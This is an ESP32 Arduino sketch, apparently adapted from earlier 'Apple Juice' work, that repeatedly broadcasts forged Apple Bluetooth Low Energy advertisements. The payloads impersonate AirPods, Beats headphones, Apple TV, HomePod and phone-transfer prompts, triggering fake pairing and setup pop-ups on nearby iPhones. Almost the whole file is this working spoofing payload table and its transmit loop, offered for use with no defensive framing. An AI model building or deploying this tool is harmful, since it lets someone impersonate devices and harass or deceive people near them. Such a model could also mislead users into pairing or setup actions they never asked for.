// ESP32 Arduino implementation of Apple Juice
// Author: Ronald Stoner
// Github: https://github.com/ronaldstoner

// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

static const char *payloads[] = {
	"\x1e\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x0e\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x0a\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x0f\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x13\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x14\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x03\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x0b\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x0c\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x11\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x10\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x05\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x06\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x09\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x17\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x12\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x1e\xff\x4c\x00\x07\x19\x07\x16\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x01\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x06\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x20\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x2b\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\xc0\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x0d\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x13\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x27\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x0b\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x09\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x02\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
	"\x16\xff\x4c\x00\x04\x04\x2a\x00\x00\x00\x0f\x05\xc1\x1e\x60\x4c\x95\x00\x00\x10\x00\x00\x00",
};

enum DeviceType {
	AIRPODS = 0,
	AIRPODS_PRO,
	AIRPODS_MAX,
	AIRPODS_GEN2,
	AIRPODS_GEN3,
	POWER_BEATS,
	POWER_BEATS_PRO,
	BEATS_SOLO_PRO,
	BEATS_STUDIO_BUDS,
	BEATS_FLEX,
	BEATS_X,
	BEATS_SOLO3,
	BEATS_STUDIO3,
	BEATS_STUDIO_PRO,
	BEATS_FIT_PRO,
	BEATS_STUDIO_BUDS_PLUS,
	APPLE_TV_SETUP,
	APPLE_TV_PAIR,
	APPLE_TV_NEW_USER,
	APPLE_TV_APPLE_IDSETUP,
	APPLE_TV_WIRELESS_AUDIO_SYNC,
	APPLE_TV_HOMEKIT_SETUP,
	APPLE_TV_KEYBOARD,
	APPLE_TV_CONNECTING_TO_NETWORK,
	HOMEPOD_SETUP,
	SETUP_NEW_PHONE,
	TRANSFER_NUMBER,
	TVCOLOR_BALANCE,
};

BLEAdvertising *pAdvertising;  // global variable

// User selectable variables
int deviceType = 4; // 1 for Airpods, 2 for Airpods Pro, 3 for Airpods Max, 4 for...
int delaySeconds = 2;

// 0 - ADV_TYPE_IND
// 1 - ADV_TYPE_DIRECT_IND_HIGH (directed advertisement with high duty cycle)
// 2 - ADV_TYPE_SCAN_IND
// 3 - ADV_NONCONN_IND
// 4 - ADV_TYPE_DIRECT_IND_LOW (directed advertisement with low duty cycle)
int advType = 2;

void setup() {
	Serial.begin(115200);
	Serial.println("Starting ESP32 BLE");

	BLEDevice::init("");

	// Create the BLE Server
	BLEServer *pServer = BLEDevice::createServer();

	pAdvertising = pServer->getAdvertising();
	BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

	// Select the appropriate data based on the device type
	const char* data = payloads[(deviceType >= 1 && deviceType <= 26) ? deviceType - 1 : 0];

	// This flag does not seem to be needed for ESP32 BLE
	// oAdvertisementData.setFlags(0x03);

	// Set the advertisement data type
	switch(advType) {
		case 0:
			pAdvertising->setAdvertisementType(ADV_TYPE_IND);
			break;
		case 1:
			pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_HIGH);
			break;
		case 2:
			pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
			break;
		case 3:
			pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
			break;
		case 4:
			pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_LOW);
			break;
	}


	int bufferSize = 31;

	// Set up the advertisement data
	oAdvertisementData.addData(std::string(data, bufferSize));
	pAdvertising->setAdvertisementData(oAdvertisementData);
}

void loop() {
	// Start advertising
	Serial.println("Sending Advertisement...");
	pAdvertising->start();
	delay(delaySeconds * 1000); // delay for delaySeconds seconds
	pAdvertising->stop();
}
